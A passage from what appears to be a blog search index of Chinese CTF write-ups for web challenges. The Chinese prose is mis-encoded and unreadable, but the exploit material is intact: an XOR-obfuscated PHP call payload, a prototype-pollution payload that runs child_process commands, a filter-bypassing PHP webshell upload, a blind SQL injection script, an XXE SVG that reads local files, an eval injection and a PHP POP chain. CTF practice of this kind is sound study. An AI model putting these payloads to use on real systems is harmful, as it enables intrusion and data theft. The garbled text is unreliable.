æ‹¿åˆ°flagæ‰€åœ¨æ–‡ä»¶ã€‚æœ€åæ„é€ ä¸€ä¸‹ï¼Œå› ä¸ºflagåœ¨æœ€åä¸€ä¸ªä½ç½®ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨endè¿›è¡Œè·å– ((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));","link":"/2021/07/24/buu23/"},{"title":"GYCTF2020-Ez_Express","text":"[GYCTF2020]Ez_Expresså‰è¨€çœ‹äº†ä¸€ä¸‹æœ‰æ³¨å†Œæœ‰ç™»å½•ï¼Œäºæ˜¯è¯•äº†ä¸€ä¸‹www.zipå‘ç°æœ‰æºç æ³„éœ²ï¼šå®¡è®¡çš„æ˜¯thinkphp6.0ï¼Œçœ‹åŠå¤©çœ‹ä¸å‡ºä¸ªæ‰€ä»¥ç„¶ï¼Œäºæ˜¯çœ‹wpäº† jsåŸå‹é“¾æ±¡æŸ“åŸå‹é“¾ç‰¹æ€§ï¼šå½“æˆ‘ä»¬è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„æŸå±æ€§æ—¶ 1.å¯¹è±¡ï¼ˆobjï¼‰ä¸­å¯»æ‰¾è¿™ä¸€å±æ€§2.å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨obj.protoä¸­å¯»æ‰¾å±æ€§3.å¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨obj.__proto__.__proto__ä¸­å¯»æ‰¾è¿™ä¸€å±æ€§ ä»¥ä¸Šæœºåˆ¶è¢«ç§°ä¸ºjsçš„prototypeçš„ç»§æ‰¿é“¾ã€‚å’Œnode.jsæ²™ç›’é€ƒé€¸çš„åŸç†ä¼¼ä¹æ˜¯ä¸€æ ·çš„ä¸¾ä¾‹ï¼š function Foo() { this.bar = 1}Foo.prototype.show = function show() { console.log(this.bar)}let foo = new Foo()foo.show() ç†è§£ï¼šFooæ˜¯ä¸€ä¸ªç±»ï¼Œprototypeæ˜¯Fooçš„å±æ€§ï¼ŒFooä¸­æ‰€æœ‰çš„å®ä¾‹åŒ–åå¯¹è±¡éƒ½å°†æ‹¥æœ‰è¿™ä¸ªå±æ€§ï¼Œæˆ‘ä»¬åœ¨prototypeå±æ€§ä¸­å®šä¹‰äº†ä¸€ä¸ªæ–¹æ³•showï¼Œæ¥ä¸‹æ¥æ‰€æœ‰å®ä¾‹åŒ–åçš„å¯¹è±¡å¦‚fooéƒ½å°†ç›´æ¥æ‹¥æœ‰fooæ–¹æ³•ã€‚åŸå‹é“¾æ±¡æŸ“å®šä¹‰: å¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯åŸå‹é“¾æ±¡æŸ“ ä¾‹ï¼š let foo={bar:1}//fooæ˜¯ä¸€ä¸ªå¯¹è±¡console.log(foo.bar)//foo.baræ­¤æ—¶ä¸º1foo.__proto__.bar=2//fooçš„åŸå‹è®¾ä¸€ä¸ªbarå€¼ä¸º2console.log(foo.bar)//è¾“å‡ºä¸º1ï¼Œå› ä¸ºfooçš„barå·²ç»ä¸º1let zoo={}//è®¾zooçš„å¯¹è±¡ä¸ºç©ºconsole.log(zoo.bar)//è¿™ä¸ªæ—¶å€™zooçš„barå°±ä¸º2ï¼Œç°åœ¨æ¯ä¸ªåŸå‹éƒ½æœ‰ä¸ªå±æ€§barå€¼ä¸º2 å“ªäº›æƒ…å†µä¸‹åŸå‹é“¾ä¼šè¢«æ±¡æŸ“ï¼Ÿåœ¨å«æœ‰èƒ½å¤Ÿæ§åˆ¶æ•°ç»„ï¼ˆå¯¹è±¡ï¼‰çš„â€œé”®åâ€çš„æ“ä½œå³å¯ï¼Œä¸€èˆ¬æ˜¯ä»¥å‡ºç°ï¼šmergeå’Œcloneå¯¹è±¡ ä¸å®‰å…¨çš„å¯¹è±¡é€’å½’åˆå¹¶ä»¥merge,å› ä¸ºmergeæ‰§è¡Œçš„å°±æ˜¯é€’å½’ï¼Œä¸ºä¾‹ï¼Œå…ˆæ„é€ ä¸€ä¸ªç®€å•çš„mergeå‡½æ•° const merge = (target, source) =&gt; { // Iterate through `source` properties and if an `Object` set property to merge of `target` and `source` properties for (const key of Object.keys(source)) { if (source[key] instanceof Object) Object.assign(source[key], merge(target[key], source[key])) } // Join `target` and modified `source` Object.assign(target || {}, source) return target}function Person(name,age,gender){//æ„é€ ä¸€ä¸ªpersonç±» this.name=name; this.age=age; this.gender=gender;}let newperson=new Person(&quot;test1&quot;,22,&quot;male&quot;);let job=JSON.parse('{&quot;title&quot;:&quot;Security Engineer&quot;,&quot;country&quot;:&quot;China&quot;,&quot;__proto__&quot;:{&quot;x&quot;:1}}');//æ–°å»ºä¸€ä¸ªjobå¯¹è±¡merge(newperson,job);//è¿™ä¸ªjobå¯¹è±¡æœ‰ç”¨titleã€contryã€__proto__å±æ€§ï¼Œå¹¶å¯¹å…¶è¿›è¡Œèµ‹å€¼console.log(newperson);console.log(Person.prototype);//æ­¤æ—¶perçš„åŸå‹å·²ç»è¢«æ”¹å˜ä¸ºx=1 è¿™é‡Œè§£é‡Šä¸€ä¸‹ï¼Œmergeå°†è¿™å‡ ä¸ªé”®å€¼ä½œä¸ºä¸€ä¸ªå±æ€§åˆå¹¶åˆ°newpersonè¿™ä¸ªå¯¹è±¡ä¸­äº†ï¼Œmergeå‡½æ•°æ‰§è¡Œçš„å…¶å®å¯ä»¥è®¤ä¸ºæ˜¯ Person.job.title=......Person.job.__proto__=.... è¿™ä¸ªæ—¶å€™jobçš„åŸå‹æ˜¯Personï¼Œæ‰€ä»¥Personçš„å€¼å°±å‘ç”Ÿäº†æ”¹å˜ã€‚ æŒ‰è·¯å¾„å®šä¹‰å±æ€§æœ‰äº›JavaScriptåº“çš„å‡½æ•°æ”¯æŒæ ¹æ®æŒ‡å®šçš„è·¯å¾„ä¿®æ”¹æˆ–å®šä¹‰å¯¹è±¡çš„å±æ€§å€¼ã€‚é€šå¸¸è¿™äº›å‡½æ•°ç±»ä¼¼ä»¥ä¸‹çš„å½¢å¼ï¼štheFunction(object, path, value)ï¼Œå°†å¯¹è±¡objectçš„æŒ‡å®šè·¯å¾„pathä¸Šçš„å±æ€§å€¼ä¿®æ”¹ä¸ºvalueã€‚å¦‚æœæ”»å‡»è€…å¯ä»¥æ§åˆ¶è·¯å¾„pathçš„å€¼ï¼Œé‚£ä¹ˆå°†è·¯å¾„è®¾ç½®ä¸º_proto_.theValueï¼Œè¿è¡ŒtheFunctionå‡½æ•°ä¹‹åå°±æœ‰å¯èƒ½å°†theValueå±æ€§æ³¨å…¥åˆ°objectçš„åŸå‹ä¸­ã€‚ å®æˆ˜www.zipä¸‹è½½æºç ï¼š ç„¶åå¼€å§‹å®¡è®¡ const merge = (a, b) =&gt; { for (var attr in b) { if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) { merge(a[attr], b[attr]); } else { a[attr] = b[attr]; } } return a}const clone = (a) =&gt; { return merge({}, a); åœ¨index.jsæ‰¾åˆ°mergeå’Œcloneï¼Œæ¥ä¸‹æ¥çœ‹çœ‹æœ‰å“ªé‡Œè°ƒç”¨äº†ä»–ä»¬ï¼Œå‘ç°æ˜¯åœ¨/actionè¿™é‡Œï¼Œå¹¶ä¸”éœ€è¦userä¸ºadmin router.post('/action', function (req, res) { if(req.session.user.user!=&quot;ADMIN&quot;){res.end(&quot;&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;&quot;)} req.session.user.data = clone(req.body); res.end(&quot;&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;&quot;); }); é‚£ä¹ˆå°±éœ€è¦å…ˆç™»å½•ï¼Œåœ¨ç™»å½•è¿™åˆ—å‘ç° **å…¶ä¸­ 'user':req.body.userid.toUpperCase() è¿™ä¸€å¥ä¸­toUpperCase()å‡½æ•°æ˜¯ä¸ºäº†å°†å­—ç¬¦ä¸²ä¸­çš„å°å†™å­—ç¬¦è½¬æ¢æˆå¤§å†™ï¼Œä½†å› ä¸ºjavascriptçš„ç‰¹æ€§ï¼Œå‡½æ•°å­˜åœ¨åˆ†é™©ï¼ˆä¸‹å›¾ï¼‰ï¼Œæ‰€ä»¥å‡å¦‚æˆ‘ä»¬ä¼ å…¥admÄ±nçš„è¯ï¼Œç»è¿‡toUpperCase()çš„å¤„ç†åï¼Œä¼šå˜æˆADMIN**å…³äºnode-jsé¢˜ç›®çš„å°è¯•/9.png) åœ¨javascriptä¸­æœ‰å‡ ä¸ªç‰¹æ®Šçš„å­—ç¬¦éœ€è¦è®°å½•ä¸€ä¸‹ å¯¹äºtoUpperCase(): å­—ç¬¦&quot;Ä±&quot;ã€&quot;Å¿&quot; ç»è¿‡toUpperCaseå¤„ç†åç»“æœä¸º &quot;I&quot;ã€&quot;S&quot;Copy å¯¹äºtoLowerCase(): å­—ç¬¦&quot;â„ª&quot;ç»è¿‡toLowerCaseå¤„ç†åç»“æœä¸º&quot;k&quot;(è¿™ä¸ªâ„ªä¸æ˜¯K) æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ³¨å†Œç”¨æˆ·åä¸ºadmÄ±nç„¶åè¿›è¡Œç™»å½•å³å¯ï¼Œæ¥ä¸‹æ¥åœ¨å»å¯ä»¥æ±¡æŸ“çš„å‚æ•°é‚£è¾¹çœ‹çœ‹è¯¥å¦‚ä½•æ„é€ payloadé¦–å…ˆå¯ä»¥å¯ä»¥çœ‹åˆ°cloneåœ¨loginé‚£è¾¹å¯¹bodyè¿›è¡Œæ“ä½œï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„åŸå‹é“¾ä¼ å…¥çš„å€¼ä¹Ÿåº”è¯¥åœ¨é‚£é‡Œ router.post('/action', function (req, res) { if(req.session.user.user!=&quot;ADMIN&quot;){res.end(&quot;&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;&quot;)} req.session.user.data = clone(req.body); res.end(&quot;&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;&quot;); }); å†å¾€ä¸‹çœ‹,æˆ‘ä»¬outputoFunctionNameè¢«æ¸²æŸ“äº†ï¼Œé‚£ä¹ˆå…¶å®æ€è·¯å°±å¾ˆæ˜ç¡®äº†ï¼Œé€šè¿‡cloneåŸå‹é“¾æ±¡æŸ“outputoFunctionNameï¼Œå¯¼è‡´å…¶å€¼è¢«æ”¹å˜ï¼Œæ¸²æŸ“æ‹¿åˆ°flag router.get('/info', function (req, res) { res.render('index',data={'user':res.outputFunctionName});}) payload: {&quot;__proto__&quot;:{&quot;outputFunctionName&quot;: &quot;test;clearTimeout.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /flag &gt; /app/public/reader').toString();var test1&quot;}} ä»è¯­æ³•çš„è§’åº¦è§£é‡Šä¸€ä¸‹è¿™ä¸ªpayloadï¼šæˆ‘ä»¬é€šè¿‡æ±¡æŸ“outputFunctionNameçš„åŸå‹ï¼Œé€šè¿‡constructorè®¿é—®å…¶å‘ä¸ŠåŸå‹é“¾ï¼Œè·å¾—ä¸»ç¯å¢ƒçš„functionï¼Œ2ç„¶åé€šè¿‡(â€˜return processâ€™)()è·å¾—ä¸»ç¯å¢ƒprocesså˜é‡ï¼Œé€šè¿‡process.mainModule.requireå¯¼å…¥child_processæ¨¡å—ï¼Œå®ç°å‘½ä»¤æ‰§è¡Œ,æœ€åå°†flagè¾“å‡ºè‡³/readerä¸­ï¼Œç”±äºè¿™ä¸ªoutputFunctionNameæ˜¯æœªå®šä¹‰çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åé¢è®¿é—®å®ƒï¼Œå°±ä¼šç›´æ¥èµ‹å€¼ä¸ºæˆ‘ä»¬å®šä¹‰çš„è¿™äº›å±æ€§ï¼ˆå’Œä¸Šé¢çš„åŸç†æ˜¯ä¸€æ ·çš„ï¼‰ æ¥è‡ªï¼šhttps://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/ è¦è®°å¾—å§ä¼ è¾“çš„å†…å®¹æ ¼å¼æ”¹ä¸ºjsonçš„ï¼Œç„¶åç™»é™†/infoè®©å…¶è¢«æ¸²æŸ“ï¼Œç„¶åå†ç™»å½•/readerå°†flagä¸‹è½½ä¸‹æ¥å³å¯ å°ç»“ç”±äºè¯­æ³•è¿˜æ˜¯æœ‰å¾ˆå¤šä¸æ‡‚ï¼Œä½†è¿˜å¥½å­¦æ²™ç›’é€ƒé€¸çš„æ—¶å€™æœ‰æŒæ¡ä¸€ç‚¹è¯­æ³•ï¼Œæ‰€ä»¥åŸç†è¿˜æ˜¯å¯ä»¥çœ‹æ‡‚çš„ï¼Œä½†æ˜¯æ„é€ è¯­å¥è¿˜æ˜¯ä¸å¤ªè¡Œæ€»ç»“ä¸€ä¸‹jsçš„åŸå‹é“¾æ±¡æŸ“1.å¯»æ‰¾mergeæˆ–è€…cloneå‡½æ•°2.å¯»æ‰¾ä½¿ç”¨è¿™ä¸¤ä¸ªå‡½æ•°çš„å¯¹è±¡ï¼ŒæŸ¥çœ‹å…¶æ˜¯å¦å¯æ§ï¼Œèƒ½æ¸²æŸ“ https://www.freebuf.com/articles/web/275619.html https://www.cnblogs.com/LEOGG321/p/13448463.html jsçš„å­—ç¬¦ï¼šhttps://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html","link":"/2021/07/22/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"},{"title":"buu24","text":"[çº¢æ˜è°·CTF 2021]write_shellé¦–å…ˆæ˜¯checkå‡½æ•°è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ function check($input){ if(preg_match(&quot;/'| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i&quot;,$input)){ // if(preg_match(&quot;/'| |_|=|php/&quot;,$input)){ die('hacker!!!'); }else{ return $input; }} å¦‚æœä¼ å…¥çš„æ˜¯æ•°ç»„ï¼Œé‚£ä¹ˆå°±ä¼šè¿›è¡Œforeachå†å¯¹å…¶é”®å€¼è¿›è¡Œcheckå‡½æ•°çš„è¿‡æ»¤ function waf($input){ if(is_array($input)){ foreach($input as $key=&gt;$output){ $input[$key] = waf($output); } }else{ $input = check($input); }} ç»è¿‡wafåçš„å†…å®¹å°†ä¼šè¢«ä¼ å…¥index.phpä¸­ case 'upload': $data = $_GET[&quot;data&quot;] ?? &quot;&quot;; waf($data); file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data); ç°åœ¨éœ€è¦æƒ³çš„å°±æ˜¯å¦‚ä½•æ„é€ shellï¼Œè¿‡æ»¤äº†phpæˆ‘ä»¬å¯ä»¥ä½¿ç”¨çŸ­æ ‡ç­¾è¿›è¡Œç»•è¿‡ï¼Œè¿‡æ»¤äº† è¿‡æ»¤äº†phpæˆ‘ä»¬å¯ä»¥ä½¿ç”¨.è¿›è¡Œè¿æ¥ï¼Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ‹¬å·è¿›è¡Œç»•è¿‡ï¼Œ /?action=upload&amp;data=&lt;?=(ph.pinfo)()?&gt; ç»•è¿‡æˆåŠŸ /?action=upload&amp;data=&lt;?=`ls%09/`?&gt; æ¥ä¸‹æ¥å°±æ˜¯catå®ƒå°±å¥½äº† [SWPU2019]Web4æµ‹è¯•äº†ä¸€ä¸‹ å‘ç°æ˜¯å †å æ³¨å…¥ï¼Œä½†æ˜¯æ²¡æœ‰è¾“å‡ºå›æ˜¾ä¿¡æ¯ï¼Œä¹Ÿä¸ç¬¦åˆå¸ƒå°”ç›²æ³¨çš„æ¡ä»¶ é‚£å°±è¦è€ƒè™‘ä¸€ä¸‹æ—¶é—´ç›²æ³¨äº†ï¼Œæ¥ä¸‹æ¥æ„é€ ä¸€ä¸‹è¯­å¥,å°è¯•äº†ä¸€ä¸‹select sleep(5)ï¼Œå‘ç°æ²¡æœ‰ååº”ï¼ŒçŒœæµ‹å­˜åœ¨è¿‡æ»¤ï¼Œå †å æ³¨å…¥çš„ç»•è¿‡æœ‰ä¸€ä¸ªé¢„å¤„ç†ï¼Œå¯ä»¥é‡‡å–ä½¿ç”¨concatè¿æ¥çš„æ–¹å¼è¿›è¡Œç»•è¿‡ ä½†æ˜¯ç”±äºä¸ç¡®å®šéƒ½è¿‡æ»¤äº†é‚£äº›å†…å®¹ï¼Œè™½ç„¶å¯ä»¥ä½¿ç”¨å»¶è¿Ÿè¿›è¡Œfuzzï¼Œä½†æ˜¯æœ‰ç‚¹éº»çƒ¦ï¼Œå¯ä»¥ç›´æ¥é‡‡ç”¨åå…­è¿›åˆ¶è½¬ç çš„å½¢å¼è¿›è¡Œç»•è¿‡ import requestsimport jsonimport timedef main(): #é¢˜ç›®åœ°å€ url = '''http://5c6e0550-a9af-461f-8eda-50bc9d0086f0.node4.buuoj.cn/index.php?r=Login/Login''' #æ³¨å…¥payload payloads = &quot;asd';set @a=0x{0};prepare ctftest from @a;execute ctftest-- -&quot; flag = '' for i in range(1,30): #æŸ¥è¯¢payload payload = &quot;select if(ascii(substr((select flag from flag),{0},1))={1},sleep(3),1)&quot; for j in range(0,128): #å°†æ„é€ å¥½çš„payloadè¿›è¡Œ16è¿›åˆ¶è½¬ç å’Œjsonè½¬ç  datas = {'username':payloads.format(str_to_hex(payload.format(i,j))),'password':'test213'} data = json.dumps(datas) times = time.time() res = requests.post(url = url, data = data) if time.time() - times &gt;= 3: flag = flag + chr(j) print(flag) breakdef str_to_hex(s): return ''.join([hex(ord(c)).replace('0x', '') for c in s])if __name__ == '__main__': main() è¿™ä¸ªæ˜¯ç½‘ä¸Šå¤§ç¥çš„è„šæœ¬ï¼Œæˆ‘çš„å¥½åƒå‡ºäº†ç‚¹é—®é¢˜ï¼Œæ²¡è·‘å‡ºæ¥â€“å¾—åˆ°glzjin_wants_a_girl_friend.zipé‡Œé¢æ˜¯æºç ï¼Œæ¥ä¸‹æ¥å®¡è®¡ä¸€ä¸‹ï¼šæ‰“å¼€controllersè¿›è¡Œå®¡è®¡ï¼Œå¯ä»¥å‘ç°basecontrollersä¸­ï¼Œæœ‰æ–‡ä»¶åŒ…å«ï¼Œé‚£ä¹ˆæˆ‘çœ‹çœ‹è¿™ä¸ªviewDataæ˜¯ç”¨extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚å¦‚æœå¯ä»¥æ§åˆ¶è¿™ä¸ªviewdataï¼Œé‚£ä¹ˆå°±å¯ä»¥å®ç°å˜é‡è¦†ç›–äº† class BaseController{ /* * åŠ è½½è§†å›¾æ–‡ä»¶ * viewName è§†å›¾åç§° * viewData è§†å›¾åˆ†é…æ•°æ® */ private $viewPath; public function loadView($viewName ='', $viewData = []) { $this-&gt;viewPath = BASE_PATH . &quot;/View/{$viewName}.php&quot;; if(file_exists($this-&gt;viewPath)) { extract($viewData); include $this-&gt;viewPath; } } } è€Œè¿™ä¸ªloadæ–¹æ³•åªåœ¨useré‡Œé¢çœ‹åˆ°ï¼Œå¹¶ä¸”listDATæ˜¯æœ‰requestè·å¾—çš„ å»userIndexé‡Œé¢æŸ¥çœ‹ä¸€ä¸‹è¿™é‡Œçš„å˜é‡æ˜¯img_fileç†ä¸€ä¸‹æ€è·¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨extractéœ€è¦å˜é‡è¦†ç›–ï¼Œä¼ å…¥çš„å€¼æ˜¯ä¹Ÿæ˜¯å¯æ§çš„ï¼Œç”¨requestï¼Œæ‰€ä»¥æ„é€ payload,é¦–å…ˆæˆ‘ä»¬å¾—å…ˆåˆ°userè¿™ä¸ªè·¯ç”±è¿™é‡Œ ä¸è¿‡å¯¹äºè¿™ä¸ªä¼ å€¼è¿˜æ˜¯æƒ³ç ”ç©¶ä¸€ä¸‹ï¼Œæ‰€ä»¥åœ¨phpstormé‡Œé¢æ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ ä¸ºä»€ä¹ˆè¦æ˜¯imgï¼Œå› ä¸ºåé¢æ˜¯è¿™ä¸ªå˜é‡çš„å†…å®¹ä¼šå›æ˜¾åœ¨ç½‘é¡µä¸Šï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªå›¾ç‰‡ [BSidesCF 2019]SVGMagicé¢˜ç›®è¯´å°†svgè½¬ä¸ºpngï¼Œsvgæ˜¯ç”¨xmlæ ¼å¼å®šä¹‰çš„å›¾åƒï¼Œæ¨æµ‹æ˜¯xxeæ³¨å…¥ åœ¨æœ¬åœ°å…ˆç¼–å†™ä¸€ä¸ªsvgæ–‡ä»¶ &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE note[&lt;!ENTITY file SYSTEM &quot;file:///proc/self/cwd/flag.txt&quot; &gt;]&gt;&lt;svg width=&quot;2000&quot; height=&quot;100&quot;&gt;&lt;text x=&quot;100&quot; y=&quot;100&quot;&gt;&amp;file;&lt;/text&gt;&lt;/svg&gt; ç„¶åå°†å…¶ä¸Šä¼ å³å¯ [DDCTF 2019]homebrew event looppythonæºç å®¡è®¡ å°†eventå†™å…¥sessionå‡½æ•° def trigger_event(event): session['log'].append(event) if len(session['log']) &gt; 5: session['log'] = session['log'][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event) æœ‰ä¸‰ä¸ªpointsï¼Œ0ä¸ªnum_itemsï¼Œä½†æ˜¯ä¸æ¸…æ¥šæœ‰ä»€ä¹ˆæ˜¯å†™åœ¨sessionä¸­çš„ è¿™é‡Œnum_itemsè¦å¤§äºç­‰äº5 flagå°±ä¼šè¢«å†™å…¥session å¦‚æœæˆ‘ä»¬å¯ä»¥å…ˆä¹°é’»çŸ³ï¼Œç„¶åè®©flagè¢«å†™å…¥sessionä¸­ï¼Œç„¶åå†æ‰£è´¹ï¼Œé‚£å°±å¯ä»¥å®ç°num_itemså¤§äºç­‰äº5ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªevalå‡½æ•°ï¼š å› ä¸ºevalå‡½æ•°åé¢çš„å‚æ•°å¯æ§æ‰€ä»¥ action:trigger_event%23;action:buy;5%23action:get_flag; ç„¶åä½¿ç”¨flask-session-manager-masterè§£å¯†sessionå³å¯è·å¾—flag","link":"/2021/07/26/buu24/"},{"title":"buu25","text":"[EIS 2019]EzPOPæ‰¾åˆ°ä¸€ä¸ªå±é™©å‡½æ•°æ ¹æ®æ­¤å‡½æ•°å¾€å‰çœ‹çœ‹æ˜¯å¦èƒ½ä¼ å€¼è¿›å»è¿™é‡Œæœ‰ä¸ªexit()ï¼Œå¥½åƒä¸ä¼šæ‰§è¡Œåé¢dataçš„å†…å®¹ï¼Œè¿™é‡Œå¾…ä¼šéœ€è¦æƒ³åŠæ³•ç»•è¿‡ï¼Œä½†æ˜¯é¦–å…ˆéœ€è¦å¼„æ‡‚å°†å€¼ä¼ å…¥çš„é“¾ dataé¦–å…ˆå¯èƒ½ä¼šç»è¿‡ä¸€ä¸ªå‹ç¼©çš„æ“ä½œä¸ºäº†ä¸è®©dataå‘ç”Ÿæ”¹å˜ï¼Œæˆ‘ä»¬å°±éœ€è¦å°†data_compressè®¾ä¸º0 æ¥ä¸‹æ¥ä¼šç»è¿‡ä¸€ä¸ªserializeçš„å‡½æ•°æ“ä½œï¼Œå¦‚æœä¸ºæ•°å­—ï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›stringçš„dataï¼Œé‚£æˆ‘ä»¬å¯ä»¥å…ˆè®©æˆ‘ä»¬dataä¼šstringç±»å‹ï¼Œåé¢å› ä¸ºserialize()å¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ªå‡½æ•°çš„æ‰§è¡Œï¼Œå¹¶ä¸”serializeå¯ä»¥ç”±æˆ‘ä»¬ç›´æ¥èµ‹å€¼ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨strvalå‡½æ•°ã€‚å‘ä¸Šæ˜¯setå‡½æ•°æ²¡ä¼ å…¥è¿™äº›å€¼ï¼Œå…¶ä¸­valueå°±æ˜¯å¯¹åº”æˆ‘ä»¬åé¢çš„data å¾€ä¸Šå¯¹åº”æ¥è‡ªäºclass Aä¸­çš„contentä¸­ï¼Œè€Œè¿™é‡Œçš„storeéœ€è¦èµ‹å€¼ä¸ºclassBä¸­ï¼Œä¸ç„¶æ‰¾ä¸åˆ°setæ–¹æ³• åœ¨å¾€ä¸Šçœ‹åˆ°æ¥è‡ªäºcleanContentsä¸­çš„cacheï¼Œè¿™ä¸ªåœ¨å‰é¢çš„å®šä¹‰ä¸­æ²¡æœ‰çœ‹åˆ°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è‡ªå·±å®šä¹‰ä¸€ä¸‹è¿™ä¸ªå˜é‡ï¼Œçœ‹åˆ°ä¸‹é¢è¿˜æœ‰ä¸€ä¸ªjson_encodeä¸ºäº†é˜²æ­¢è¢«json_encodeï¼Œæˆ‘ä»¬è¿™é‡Œè¿˜éœ€è¦å°†completeè®¾ç½®ä¸º0è¿™æ ·å­çš„è¯å°±å¯ä»¥é¿å…è¢«json_encode æœ€åå†å‘ä¸Šæ¥åˆ°constructè¿™é‡Œï¼Œè¿™é‡Œæœ‰å¯¹storeè¿›è¡Œèµ‹å€¼ï¼Œè¿™é‡Œéœ€è¦èµ‹å€¼ä¸ºnew B ç°åœ¨æ•´ç†ä¸€ä¸‹ç¼–å†™popé“¾æ¡ï¼š &lt;?phpclass A{ public $store; public $key=&quot;a.php&quot;; public $expire; public $cache; public $complete; public function __construct($store) { $this-&gt;store=$store; }}class B{ public $options;}$b=new B();$b-&gt;options=array('data_compress'=&gt;0,'expire'=&gt;0,'serialize'=&gt;'strval');$a=new A($b);$a-&gt;cache=array(1=&gt;array(1=&gt;1));$a-&gt;complete=0;$a-&gt;key=1;$a-&gt;expire=null;echo serialize($a); ç°åœ¨çš„éš¾ç‚¹åœ¨äºæˆ‘ä»¬å†™å…¥çš„å†…å®¹å‰é¢æœ‰ä¸€ä¸ªexit()è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å†™å…¥çš„å†…å®¹å°†ä¸ä¼šè¢«æ‰§è¡Œï¼Œå‚è€ƒhttps://www.leavesongs.com/PENETRATION/php-filter-magic.htmlè¿™é‡Œä»‹ç»çš„æ–¹æ³•æ˜¯è¿™æ ·çš„ï¼šå…ˆä½¿ç”¨php://filter/wtrite=convert.base64.decode/resource=./uploads/ä¼ªåè®®ï¼Œå¯¹åŸæœ¬æ–‡ä»¶ä¸­çš„å†…å®¹è¿›è¡Œbase64ç¼–ç åçš„è¯»å–ï¼Œé™¤æ‰é‚£äº›&lt;?çš„ç‰¹æ®Šå­—ç¬¦ï¼Œæˆ‘ä»¬åªä¼šå¯¹phpexitè¿›è¡Œbase64ç¼–ç ï¼Œæˆ‘ä»¬ä¼ å…¥çš„å†…å®¹ä¹Ÿéœ€è¦æ˜¯base64åŠ å¯†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å¤šä¼ å…¥å‡ ä¸ªå­—ç¬¦ï¼Œæ‰“ä¹±å‰é¢çš„åŠ å¯†base64åŠ å¯†æ–¹å¼ï¼šç¬¬ä¸€æ­¥ï¼Œå°†å¾…è½¬æ¢çš„å­—ç¬¦ä¸²æ¯ä¸‰ä¸ªå­—èŠ‚åˆ†ä¸ºä¸€ç»„ï¼Œæ¯ä¸ªå­—èŠ‚å 8bitï¼Œé‚£ä¹ˆå…±æœ‰24ä¸ªäºŒè¿›åˆ¶ä½ã€‚ç¬¬äºŒæ­¥ï¼Œå°†ä¸Šé¢çš„24ä¸ªäºŒè¿›åˆ¶ä½æ¯6ä¸ªä¸€ç»„ï¼Œå…±åˆ†ä¸º4ç»„ã€‚ç¬¬ä¸‰æ­¥ï¼Œåœ¨æ¯ç»„å‰é¢æ·»åŠ ä¸¤ä¸ª0ï¼Œæ¯ç»„ç”±6ä¸ªå˜ä¸º8ä¸ªäºŒè¿›åˆ¶ä½ï¼Œæ€»å…±32ä¸ªäºŒè¿›åˆ¶ä½ï¼Œå³å››ä¸ªå­—èŠ‚ã€‚ç¬¬å››æ­¥ï¼Œæ ¹æ®Base64ç¼–ç å¯¹ç…§è¡¨ï¼ˆè§ä¸‹å›¾ï¼‰è·å¾—å¯¹åº”çš„å€¼ã€‚åè¿‡æ¥ï¼Œbase64è§£ç æ—¶ï¼Œä¸€å®šæ˜¯4ä¸ªæœ‰æ•ˆå­—èŠ‚ä¸ºä¸€ç»„è¿›è¡Œè§£ç  æ‰€ä»¥è¯´è¿™é‡Œè¦è·Ÿè¸ªä¸€ä¸‹contentä¼ 